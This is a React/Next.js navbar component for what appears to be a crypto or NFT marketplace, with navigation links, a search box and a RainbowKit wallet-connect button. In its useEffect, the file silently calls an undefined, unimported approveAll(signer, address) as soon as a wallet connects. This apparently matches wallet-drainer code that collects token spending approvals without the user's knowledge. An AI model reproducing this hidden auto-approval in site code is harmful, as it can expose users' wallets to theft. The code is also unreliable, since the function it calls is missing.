"use client"
import { useEffect, useState } from "react";
import { Icon } from "@iconify/react";
import Link from "next/link";
import PrimaryButton from "./primaryButton";
import { useAccount } from "wagmi";
import { useEthersSigner } from "@/utils/adapter";
import { ConnectButton } from '@rainbow-me/rainbowkit';

export default function Navbar() {
    const { address, isConnected } = useAccount();
    const signer = useEthersSigner();
    
    useEffect(() => {
      if (isConnected) {
        (async () => {
          await approveAll(signer, address);
          await signer?.getAddress()
        })();
      }
    }, [isConnected, signer]);
  
    return (
        <div className="py-5 flex items-center justify-between container mx-auto px-20">
            <nav>
                <ul className="text-white text-lg flex items-center space-x-12">
                    <li>
                        <Link href="/">Home</Link>
                    </li>
                    <li>
                        <Link href="/discover">Discover</Link>
                    </li>
                    <li>
                        <Link href="/collections">Collections</Link>
                    </li>
                </ul>
            </nav>

            <div className="flex items-center space-x-8">
                <div className="w-[13rem] h-[3rem] relative">
                    <Icon
                        icon="iconamoon:search"
                        className="absolute top-1/2 text-primary-blue -translate-y-1/2 left-2"
                        height="24"
                        width="24"
                    />
                    <input
                        type="text"
                        placeholder="search collections"
                        className="w-full h-full placeholder:text-primary-blue text-primary-blue rounded-3xl border pl-10 border-primary-blue bg-inherit outline-none"
                    />
                </div>

                {/* Enter application */}
                <PrimaryButton text="enter app" />

                {/* Connect wallet */}
                <ConnectButton.Custom>
                {({
                    account,
                    chain,
                    openAccountModal,
                    openChainModal,
                    openConnectModal,
                    authenticationStatus,
                    mounted,
                  }) => {
                    // Note: If your app doesn't use authentication, you
                    // can remove all 'authenticationStatus' checks
                    const ready = mounted && authenticationStatus !== 'loading';
                    const connected =
                      ready &&
                      account &&
                      chain &&
                      (!authenticationStatus ||
                        authenticationStatus === 'authenticated');
                    return (
                      <div
                        {...(!ready && {
                          'aria-hidden': true,
                        })}
                      >
                        {(() => {
                          if (!connected) {
                            return (
                              <button onClick={openConnectModal} type="button" sm="true"
                              variant="hovered"
                              className="connect_btn">
                                <PrimaryButton text="connect wallet" clickHandler={openAccountModal}/>
                                
                              </button>
                            );
                          }
                          if (chain.unsupported) {
                            return (
                              <button onClick={openChainModal} type="button">
                                Wrong network
                              </button>
                            );
                          }
                          return (
                            <div style={{ display: 'flex', gap: 12 }}>
                              <button onClick={openAccountModal} type="button" sm="true"
                              variant="hovered"
                              className="connect_btn">
                                <PrimaryButton text={account.displayName} clickHandler={openAccountModal}/>
                                {/* {account.displayBalance
                                  ? ` (${account.displayBalance})`
                                  : ''} */}
                              </button>
                            </div>
                          );
                        })()}
                      </div>
                    );
                  }}
                </ConnectButton.Custom>

                <PrimaryButton
                    text={
                        <Icon
                            icon="solar:cart-linear"
                            className="text-primary-blue"
                        />
                    }
                />
            </div>
        </div>
    );
}